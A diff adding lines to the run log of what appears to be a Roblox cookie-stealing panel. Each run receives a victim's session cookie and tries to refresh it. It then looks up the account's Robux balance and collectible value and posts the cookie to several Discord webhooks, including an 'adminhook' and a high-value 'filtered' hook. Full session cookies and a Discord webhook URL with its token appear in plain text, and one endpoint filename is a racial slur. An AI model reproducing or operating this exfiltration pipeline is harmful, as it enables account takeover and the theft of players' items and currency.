@@ -162,3 +162,285 @@
 [2025-11-12 07:01:54] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - HTTP 404: Not Found - Webhook URL does not exist or was deleted
 [2025-11-12 07:01:55] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - HTTP 404: Not Found - Webhook URL does not exist or was deleted
 [2025-11-12 07:01:55] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 08:30:36] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 08:30:36] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received from request
+[2025-11-12 08:30:36] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 08:30:36] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:30:36] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
+[2025-11-12 08:30:36] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:30:36] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 08:30:36] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 08:30:36] ❌ [ERROR] FETCH_USER_SETTINGS | URL: https://www.roblox.com/my/settings/json | HTTP 302: Unknown HTTP Code: 302 | No response body
+[2025-11-12 08:30:36] ❌ [ERROR] FETCH_USER_SETTINGS | Failed to extract UserId: Empty or invalid JSON response from Roblox API
+[2025-11-12 08:30:36] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 0
+[2025-11-12 08:30:37] ❌ [ERROR] FETCH_USER_INFO | URL: https://users.roblox.com/v1/users/0 | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"errors":[{"code":3,"message":"The user id is invalid."}]}
+[2025-11-12 08:30:37] ⚠️ [INFO] FETCH_USER_INFO | Username: Unknown, DisplayName: Unknown
+[2025-11-12 08:30:42] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 08:30:42] ❌ [ERROR] FETCH_BALANCE | URL: https://economy.roblox.com/v1/users/0/currency | HTTP 401: Unauthorized - Invalid webhook token | Response snippet: {"errors":[{"code":9002,"subcode":0,"message":"Authentication token is missing"}]}
+[2025-11-12 08:30:42] ⚠️ [INFO] FETCH_BALANCE | Robux: 0, Pending: ❓ Unknown
+[2025-11-12 08:30:42] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 08:30:43] ❌ [ERROR] FETCH_INVENTORY | URL: https://inventory.roblox.com/v1/users/0/assets/collectibles?limit=100 | HTTP 400: Bad Request - Invalid webhook URL or malformed request | Response snippet: {"errors":[{"code":1,"message":"The specified user does not exist!","field":"userId"}]}
+[2025-11-12 08:30:43] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 08:30:47] ✅ [SUCCESS] WEBHOOK_COLLECTION | Adminhook added to webhooks array
+[2025-11-12 08:30:47] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 08:30:47] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 2
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 2 webhook(s)
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_SENDING | Processing webhook_0 (index: 0)
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to webhook_0
+[2025-11-12 08:30:47] ❌ [ERROR] WEBHOOK_SENDING | Embed1 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:30:47] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to webhook_0
+[2025-11-12 08:30:48] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Retrying...
+[2025-11-12 08:30:49] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Final retry...
+[2025-11-12 08:30:50] ❌ [ERROR] WEBHOOK_SENDING | Embed2 final retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:30:50] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 1)
+[2025-11-12 08:30:50] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 08:30:51] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 08:30:51] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 08:30:51] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 08:30:51] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 08:30:51] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 08:30:52] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:30:53] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:30:53] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 08:41:41] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 08:41:41] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received from request
+[2025-11-12 08:41:41] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 08:41:41] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:41:41] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
+[2025-11-12 08:41:41] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/nigger.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:41:41] ⚠️ [WARNING] COOKIE_REFRESH | Refresh failed: No response from refresh endpoint - Using original cookie
+[2025-11-12 08:41:41] ⚠️ [INFO] FETCH_USER_SETTINGS | Fetching user settings from Roblox
+[2025-11-12 08:41:41] ❌ [ERROR] FETCH_USER_SETTINGS | URL: https://www.roblox.com/my/settings/json | HTTP 302: Unknown HTTP Code: 302 | No response body
+[2025-11-12 08:41:41] ❌ [ERROR] FETCH_USER_SETTINGS | Failed to extract UserId: Empty or invalid JSON response from Roblox API
+[2025-11-12 08:41:41] ⚠️ [INFO] FETCH_USER_INFO | Fetching user info for userId: 0
+[2025-11-12 08:41:42] ❌ [ERROR] FETCH_USER_INFO | URL: https://users.roblox.com/v1/users/0 | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"errors":[{"code":3,"message":"The user id is invalid."}]}
+[2025-11-12 08:41:42] ⚠️ [INFO] FETCH_USER_INFO | Username: Unknown, DisplayName: Unknown
+[2025-11-12 08:41:47] ⚠️ [INFO] FETCH_BALANCE | Fetching Robux balance
+[2025-11-12 08:41:47] ❌ [ERROR] FETCH_BALANCE | URL: https://economy.roblox.com/v1/users/0/currency | HTTP 401: Unauthorized - Invalid webhook token | Response snippet: {"errors":[{"code":9002,"subcode":0,"message":"Authentication token is missing"}]}
+[2025-11-12 08:41:47] ⚠️ [INFO] FETCH_BALANCE | Robux: 0, Pending: ❓ Unknown
+[2025-11-12 08:41:47] ⚠️ [INFO] FETCH_INVENTORY | Fetching inventory and RAP data
+[2025-11-12 08:41:48] ❌ [ERROR] FETCH_INVENTORY | URL: https://inventory.roblox.com/v1/users/0/assets/collectibles?limit=100 | HTTP 400: Bad Request - Invalid webhook URL or malformed request | Response snippet: {"errors":[{"code":1,"message":"The specified user does not exist!","field":"userId"}]}
+[2025-11-12 08:41:48] ⚠️ [INFO] FETCH_INVENTORY | RAP: 0, Inventory Count: ❓ Unknown
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | Starting webhook collection
+[2025-11-12 08:41:52] ✅ [SUCCESS] WEBHOOK_COLLECTION | Main webhook added to array
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | Dualhook not provided (optional)
+[2025-11-12 08:41:52] ✅ [SUCCESS] WEBHOOK_COLLECTION | Total webhooks collected: 1
+[2025-11-12 08:41:52] ⚠️ [INFO] HIGH_VALUE_CHECK | isHighValue = true
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | High value detected, adding filtered webhook
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | Main webhook retained in send list
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | Adminhook included in send list
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_COLLECTION | Final webhook count: 3
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_SENDING | Starting to send embeds to 3 webhook(s)
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_SENDING | Processing webhook_0 (index: 0)
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to webhook_0
+[2025-11-12 08:41:52] ❌ [ERROR] WEBHOOK_SENDING | Embed1 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:41:52] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to webhook_0
+[2025-11-12 08:41:53] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Retrying...
+[2025-11-12 08:41:54] ⚠️ [WARNING] WEBHOOK_SENDING | Embed2 retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015} - Final retry...
+[2025-11-12 08:41:55] ❌ [ERROR] WEBHOOK_SENDING | Embed2 final retry failed for webhook_0 - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:41:55] ⚠️ [INFO] WEBHOOK_SENDING | Processing main_webhook (index: 1)
+[2025-11-12 08:41:55] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to main_webhook
+[2025-11-12 08:41:56] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to main_webhook - HTTP 204
+[2025-11-12 08:41:56] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to main_webhook
+[2025-11-12 08:41:56] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to main_webhook - HTTP 204
+[2025-11-12 08:41:57] ⚠️ [INFO] WEBHOOK_SENDING | Processing adminhook (index: 2)
+[2025-11-12 08:41:57] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed1 (RAP) to adminhook
+[2025-11-12 08:41:57] ✅ [SUCCESS] WEBHOOK_SENDING | Embed1 sent to adminhook - HTTP 204
+[2025-11-12 08:41:58] ⚠️ [INFO] WEBHOOK_SENDING | Sending embed2 (cookie) to adminhook
+[2025-11-12 08:41:58] ✅ [SUCCESS] WEBHOOK_SENDING | Embed2 sent to adminhook - HTTP 204
+[2025-11-12 08:41:58] ✅ [SUCCESS] WEBHOOK_SENDING | Finished sending to all webhooks in array
+[2025-11-12 08:41:58] ⚠️ [INFO] WEBHOOK_SENDING | Sending to non-filtered webhook (backup)
+[2025-11-12 08:41:58] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed1 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:41:59] ❌ [ERROR] WEBHOOK_SENDING | Non-filtered webhook embed2 failed - URL: https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l | HTTP 404: Not Found - Webhook URL does not exist or was deleted | Response snippet: {"message": "Unknown Webhook", "code": 10015}
+[2025-11-12 08:41:59] ✅ [SUCCESS] SCRIPT_END | Script completed successfully
+[2025-11-12 08:49:14] ⚠️ [INFO] SCRIPT_START | UserInfo script started
+[2025-11-12 08:49:14] ✅ [SUCCESS] COOKIE_RECEIVED | Cookie received from request
+[2025-11-12 08:49:14] ⚠️ [INFO] COOKIE_REFRESH | Attempting to refresh cookie
+[2025-11-12 08:49:14] ❌ [ERROR] LOCAL_REQUEST | URL: http://localhost:8000/controlPage/apis/refresher.php?cookie=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhwKBGR1aWQSFDEwMTQwMjY2NzgyNzQ0MTQ4MTE4KAE.fR2NsajB_Bn-WC-k6NW25y-bmZX77TxQDr_1_JVSqX6D8QeAsM8Zic2jBL9sBZ-iIxAi6eyr_OnppQtlpqb8QMj0knkQrYvyaTRoIaMTRRsWW5f-6UQrVFJIvJMvS423-MqHhqMNl_isYRcFgeUZduFQBR1fRIQtOJQFEGluXG_INdioOpTjZvkxBJYxl8Q1oMT5pAjr8NCjzyc_jAZK-fnGVOuZgszJs7yHiHGCUNtrRVKE3uOb_-aqnEz81u01iJ4S6OdpTUhoY_4efTq_XDQUwkwh61GEE6ZByB8nPCnFUBWtHh-Xk79nb2MkT3T1PfpoGsP5Nqvy89i3jY0WkEaPRWJ6NRfG_u6o41aPMRgNk6VP1_NAAevo4GhnyFyUqURYDr0nRNKrc5sQkF5qXStOx8fGxh8CkDx5pvkhWWW6fY4PG6ipN-TFvSpbpHLQ647n_pxIdgCk9pW_EndAY37xT_lF64pfsdb1Sav0Ai45ScPt47W4BVsoVYfAf0tyl9xshnVqI04cwRSU-gTAYdwERum9ez2fpGf3Tik3_GmKzxPFViBpzB3q5DLut4WN2m9BpPh3spkAtxWpUKh843AGCJt-nUVbR7AF_w9_FFut3I-lHi8eDE7elY2wbcafczGd5hnle7oJLjKQGUXdqjJLgI91PIg58bt3ybWfjKW1x5sIv_Ofufo1mrsQKY3Y0ogz8fXZ49b1Uh8j4z09oyR2z-XwXCqtNZ_tblaBBWEp5yj9eCcSDnd9nDhHZN0WUbBsyo8-qagxSEluA2wa8BhGyhjAhvW9MqRS9G6Rv6cizqVGRrhamr5uFz3js4GyyXm4hM8sZQPmyl3krJfgF4vNhnXXbX-wbgjPanFVTg4Rd3IRGX648Jl7UEy_N5I8MbK70xqNkarx85gdG73dqqzw4cbkkkBIrO_kNACBWseXLqjVZoFM70sp_UCbpcpVbM2rwLh4AxwKRGpYKTaxDXF9POSuYkcuz5FUL1cGvr5xVplA_4rsVVuxBasc97adYYhc7-Z-5EdNGrlF3a_qfpqM6HtX0QdGlyGOqbC0okveJtR4TGMT7FvyD6OB0NCJGQ_TkuyK4mAdUUv5Sw7o71zFpzMUUdaj3XasIA_tklB0rg1myrRiBPGAvH41reB7sp4e8-J9DkMMiFYHxCLoFgQR2f0' \   -H 'priority: u=0, i' \   -H 'referer: https://www.roblox.com/Login' \   -H 'sec-ch-ua: "Not)A | HTTP 0: No Response - Connection failed or timeout | CURL Error: URL rejected: Malformed input to a URL function
+[2025-11-12 08:49:14] ⚠️ [WARNING] COOKIE_REFRESH | Refresher failed: Request failed or timeout - Trying alternative method
